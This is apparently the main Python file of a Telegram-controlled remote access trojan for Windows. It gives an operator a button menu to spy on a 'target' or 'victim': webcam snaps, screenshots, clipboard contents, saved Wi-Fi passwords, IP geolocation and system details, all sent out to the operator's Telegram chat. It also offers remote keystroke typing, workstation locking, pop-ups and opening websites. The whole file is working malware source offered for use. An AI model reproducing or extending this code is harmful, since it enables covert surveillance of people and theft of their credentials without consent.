from distutils.command.config import config
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
from telegram.ext import ConversationHandler, MessageHandler, Filters
from Modules.monitoring import start_monitoring, stop_monitoring
from Modules.ip import get_ip_address
import urllib.request
import telepot
import shutil
import json
import flag
import pyperclip
import ctypes
import subprocess
import requests
import sys
import getpass
import cv2
import pyautogui
import numpy as np
import telepot
import time
import threading
from Modules import (
    ip,
    webcam_snap,
    screen_shot,
    text_speaker,
    system_info,
    move_mouse,
    get_wifi_password,
    chat,
    show_popup,
    send_key_press,
    wifi_scanner,
    open_website,
)


if getattr(sys, 'frozen', False):
    config_path = os.path.join(sys._MEIPASS, "config.json")
else:
    config_path = "config.json"


with open(config_path) as f:
    config_file = json.load(f)
    api_key = config_file["apiKey"]
    chat_id = config_file["chatID"]

username = getpass.getuser()
telegram_parsing_mode = ParseMode.HTML

updater = Updater(api_key, use_context=True)
dispatcher = updater.dispatcher



def listToString(s):
    str1 = " "
    return str1.join(s)


def main_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("Lock Target", callback_data="lock_desktop")],
        [InlineKeyboardButton("Monitoring", callback_data="get_monitoring")],
        [InlineKeyboardButton("Take Photo", callback_data="get_Webcam")],
        [InlineKeyboardButton("Screenshot", callback_data="get_Screenshot")],
        [InlineKeyboardButton("Move mouse", callback_data="move_mouse")],
        [InlineKeyboardButton("Location", callback_data="get_ip")],
        [InlineKeyboardButton("System Information", callback_data="get_system_info")],
        [InlineKeyboardButton("Get Clipboard", callback_data="get_clipboard")],
        [InlineKeyboardButton("Wi-Fi Access Points", callback_data="get_wifi_accesspoints")],
        [InlineKeyboardButton("Wi-Fi Password", callback_data="get_wifi_password")],

        [InlineKeyboardButton("Text To Speech", callback_data="speak")],
        [InlineKeyboardButton("Send Message", callback_data="sendMessage")],
        [InlineKeyboardButton("Alert Box", callback_data="show_popup")],
        [InlineKeyboardButton("Open Website", callback_data="open_website")],
        [InlineKeyboardButton("Type String", callback_data="type_stringKey")],
        
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    if update and update.effective_chat:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Connected Target", reply_markup=reply_markup)
    else:
        context.bot.send_message(chat_id=chat_id, text="Connected Target", reply_markup=reply_markup)


main_menu(None, dispatcher)

def speak(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    text_speaker.text_speaker(Crt_values)


def chat_message(update, context):
    inputs = (update.message.text).split()
    Crt_values = inputs[1:]
    client_message = chat.chat(listToString(Crt_values))
    if client_message:
        update.message.reply_text(f"Message from {username} : {client_message}")


def showPopup(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])

    show_popup.show_popup(Crt_values)


def type_string(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    send_key_press.send_key_press(Crt_values)


def open_websites(update, context):
    inputs = (update.message.text).split()
    Crt_values = listToString(inputs[1:])
    open_website.open_website(Crt_values)

def lock_desktop(chat_id, context):
    try:
        ctypes.windll.user32.LockWorkStation()
        context.bot.send_message(chat_id=chat_id, text="Target has been locked.")
    except Exception as e:
        context.bot.send_message(chat_id=chat_id, text=f"Failed to lock desktop: {str(e)}")

def take_snapshot(update, context):
    webcam_snap.webcam_snap() 
    context.bot.send_document(
        chat_id=update.message.chat_id,
        caption="Webcam Snap",
        document=open("webcam.jpg", "rb"),
    )

def take_screenshot(update, context):
    screen_shot.screen_shot()  
    context.bot.send_photo(
        chat_id=update.message.chat_id,
        caption="Screenshot",
        photo=open("Screenshot.png", "rb"),
    )
    os.remove("Screenshot.png")

def mouse_move(update, context):
    context.bot.send_message(
        chat_id=update.message.chat_id,
        text="Moving mouse randomly",
    )
    
 
    move_mouse.move_mouse()  
    

    context.bot.send_message(chat_id=update.message.chat_id, text="Done!")

def get_ip_info(update, context):
    flag_emoji, ip_address, city, latitude, longitude = get_ip_address()  
    
    message = (f"<b>Country:</b> {flag_emoji}\n"
               f"<b>IP Address:</b> {ip_address}\n"
               f"<b>City:</b> {city}\n"
               f"<b>Latitude:</b> {latitude}\n"
               f"<b>Longitude:</b> {longitude}")
    
    # Kirim pesan yang berisi informasi IP address ke pengguna
    context.bot.send_message(
        chat_id=update.message.chat_id,
        text=message,
        parse_mode=ParseMode.HTML  # Menetapkan mode parsing pesan menjadi HTML
    )

def send_system_info(update, context):
    # Dapatkan informasi sistem
    sys_info = system_info.system_info()
    
    # Buat pesan yang berisi informasi sistem
    message = (f"<b>-------Hardware Information-----</b>\n\n"
               f"System --> {sys_info.get_system()}\n"
               f"Name --> {sys_info.get_system_name()}\n"
               f"Release --> {sys_info.get_system_release()}\n"
               f"Version --> {sys_info.get_system_version()}\n"
               f"Machine --> {sys_info.get_system_machine()}\n"
               f"Processor --> {sys_info.get_system_processor()}\n\n"
               f"<b>-------Memory Info-----</b>\n\n"
               f"Memory Total --> {round(sys_info.mem_total)} GB\n"
               f"Free Memory --> {round(sys_info.mem_free)} GB\n"
               f"Used Memory --> {round(sys_info.mem_used)} GB\n\n"
               f"-------<b>Hard Disk Info-----</b>\n\n"
               f"Total HDD --> {round(sys_info.HDD_total)} GB\n"
               f"Used HDD --> {round(sys_info.HDD_Used)} GB\n"
               f"Free HDD --> {round(sys_info.HDD_Free)} GB\n")
    
    # Kirim pesan yang berisi informasi sistem ke pengguna
    context.bot.send_message(
        chat_id=update.message.chat_id,
        text=message,
        parse_mode=ParseMode.HTML  # Menetapkan mode parsing pesan menjadi HTML
    )

def send_clipboard_content(update, context):
    # Dapatkan konten dari clipboard
    clipboard_content = pyperclip.paste()
    
    # Kirim pesan yang berisi konten clipboard ke pengguna
    context.bot.send_message(
        chat_id=update.message.chat_id,
        text=f"Clipboard Content:\n{clipboard_content}"
    )

def send_wifi_access_points(update, context):
    # Lakukan pemindaian jaringan WiFi
    access_points = wifi_scanner.wifi_scanner()
    
    # Dapatkan username pengguna
    username = update.message.from_user.username
    
    # Kirim pesan yang berisi daftar akses titik WiFi ke pengguna
    context.bot.send_message(
        chat_id=update.message.chat_id,
        text=f"<b>Access Points from {username}:</b>\n{access_points}",
        parse_mode=ParseMode.HTML  # Menetapkan mode parsing pesan menjadi HTML
    )

def send_wifi_password(update, context):
    # Dapatkan daftar password WiFi yang tersimpan
    wifi_passwords = get_wifi_password.get_wifi_password()
    
    # Gabungkan daftar password menjadi satu string dengan pemisah baris baru
    wifi_password_text = "\n".join(wifi_passwords)
    
    # Kirim pesan yang berisi daftar password WiFi ke pengguna
    context.bot.send_message(
        chat_id=update.message.chat_id,
        text=wifi_password_text
    )

def shortcut_to_speak(update, context):
    update.message.reply_text("To Use, /speak <text>")

def shortcut_to_showpopup(update, context):
    update.message.reply_text("To use, /show_popup <message>")

def shortcut_to_typestring(update, context):
    update.message.reply_text("To use, /type_string <string>")

def shortcut_to_websites(update, context):
    update.message.reply_text("To use, /open_website <website>")

def shortcut_to_sendmessage(update, context):
    update.message.reply_text("To use, /send_message <message>")


def button(update, context):
    query = update.callback_query
    query.answer()
    result = query.data

    if result == "get_Webcam":
        webcam_snap.webcam_snap()
        dispatcher.bot.send_document(
            chat_id=chat_id,
            caption="'Webcam Snap",
            document=open("webcam.jpg", "rb"),
        )
        os.remove("webcam.jpg")

    elif result == "get_system_info":
        sys_info = system_info.system_info()
        context.bot.send_message(
            chat_id=chat_id,
            text=f"<b>-------Hardware Information-----</b>\n\n"
            f"System --> {sys_info.get_system()}\n"
            f"Name --> {sys_info.get_system_name()}\n"
            f"Release --> {sys_info.get_system_release()}\n"
            f"Version --> {sys_info.get_system_version()}\n"
            f"Machine --> {sys_info.get_system_machine()}\n"
            f"Processor --> {sys_info.get_system_processor()}\n\n"
            f"<b>-------Memory Info-----</b>\n\n"
            f"Memory Total --> {round(sys_info.mem_total)} GB\n"
            f"Free Memory --> {round(sys_info.mem_free)} GB\n"
            f"Used Memory --> {round(sys_info.mem_used)} GB\n\n"
            f"-------<b>Hard Disk Info-----</b>\n\n"
            f"Total HDD --> {round(sys_info.HDD_total)} GB\n"
            f"Used HDD --> {round(sys_info.HDD_Used)} GB\n"
            f"Free HDD --> {round(sys_info.HDD_Free)} GB\n",
            parse_mode=telegram_parsing_mode,
        )
    elif result == "lock_desktop":
        try:
            ctypes.windll.user32.LockWorkStation()
            context.bot.send_message(chat_id=chat_id, text="Target has been locked.")
        except Exception as e:
            context.bot.send_message(chat_id=chat_id, text=f"Failed to lock desktop: {str(e)}")
            
    elif result == "get_monitoring":
        context.bot.send_message(
            chat_id=chat_id,
            text="To start monitoring the target, use: /play and stop use: /done",
        )

    elif result == "get_Screenshot":
        screen_shot.screen_shot()
        dispatcher.bot.send_photo(
            chat_id=chat_id,
            caption="Screenshot",
            photo=open("Screenshot.png", "rb"),
        )
        os.remove("Screenshot.png")

            
    elif result == "sendMessage":
        context.bot.send_message(
            chat_id=chat_id,
            text="To send message to victim, use /send_message <message>",
        )

    elif result == "open_website":
        context.bot.send_message(
            chat_id=chat_id,
            text="To open website, use /open_website <website>",
        )
    
    elif result == "get_ip":
        flag_emoji, ip_address, city, latitude, longitude = ip.get_ip_address()
        message = (f"<b>Country:</b> {flag_emoji}\n"
                   f"<b>IP Address:</b> {ip_address}\n"
                   f"<b>City:</b> {city}\n"
                   f"<b>Latitude:</b> {latitude}\n"
                   f"<b>Longitude:</b> {longitude}")
        context.bot.send_message(
            chat_id=chat_id,
            text=message,
            parse_mode=telegram_parsing_mode,
        )

    elif result == "move_mouse":
        context.bot.send_message(
            chat_id=chat_id,
            text="Moving mouse randomly",
        )
        move_mouse.move_mouse()
        context.bot.send_message(chat_id=chat_id, text="Done!")

    elif result == "send_keypress":
        context.bot.send_message(
            chat_id=chat_id,
            text="To send keypress, use /type_string <string>",
        )

    elif result == "show_popup":
        context.bot.send_message(
            chat_id=chat_id,
            text="To show alert box, use /show_popup <message>",
        )

    elif result == "get_clipboard":
        context.bot.send_message(
            chat_id=chat_id, text=f" Clipboard : \n {pyperclip.paste()}"
        )

    elif result == "get_wifi_password":
        wifi_pass = " \n".join(get_wifi_password.get_wifi_password())
        context.bot.send_message(
            chat_id=chat_id,
            text=wifi_pass,
        )

    elif result == "type_stringKey":
        context.bot.send_message(
            chat_id=chat_id,
            text="To type string key, use /type_string <string>",
        )

    elif result == "get_wifi_accesspoints":
        access_points = wifi_scanner.wifi_scanner()
        context.bot.send_message(
            chat_id=chat_id,
            text=f"<b>Access Points from {username}:</b> \n {access_points}",
            parse_mode=telegram_parsing_mode,
        )

    elif result == "speak":
        context.bot.send_message(
            chat_id=chat_id,
            text="To speak, use /speak <text>",
        )



updater.dispatcher.add_handler(CommandHandler("start", main_menu))

updater.dispatcher.add_handler(CommandHandler('lock', lock_desktop))
updater.dispatcher.add_handler(CommandHandler('play', start_monitoring))
updater.dispatcher.add_handler(CommandHandler('done', stop_monitoring))
updater.dispatcher.add_handler(CommandHandler("take", take_snapshot))
updater.dispatcher.add_handler(CommandHandler("screenshot", take_screenshot))
updater.dispatcher.add_handler(CommandHandler("move", mouse_move))
updater.dispatcher.add_handler(CommandHandler("ipinfo", get_ip_info))
updater.dispatcher.add_handler(CommandHandler("clip", send_clipboard_content))
updater.dispatcher.add_handler(CommandHandler("sysinfo", send_system_info))
updater.dispatcher.add_handler(CommandHandler("wifiap", send_wifi_access_points))
updater.dispatcher.add_handler(CommandHandler("sendwifi", send_wifi_password))

dispatcher.add_handler(CommandHandler("sp", shortcut_to_speak))
dispatcher.add_handler(CommandHandler("se", shortcut_to_sendmessage))
dispatcher.add_handler(CommandHandler("sh", shortcut_to_showpopup))
dispatcher.add_handler(CommandHandler("ty", shortcut_to_typestring))
dispatcher.add_handler(CommandHandler("we", shortcut_to_websites))

updater.dispatcher.add_handler(CommandHandler("speak", speak))
updater.dispatcher.add_handler(CommandHandler("send_message", chat_message))
updater.dispatcher.add_handler(CommandHandler("show_popup", showPopup))
updater.dispatcher.add_handler(CommandHandler("type_string", type_string))
updater.dispatcher.add_handler(CommandHandler("open_website", open_websites))

# Telegram Keyboard buttons callbacks
updater.dispatcher.add_handler(CallbackQueryHandler(button))




updater.start_polling()
updater.idle()
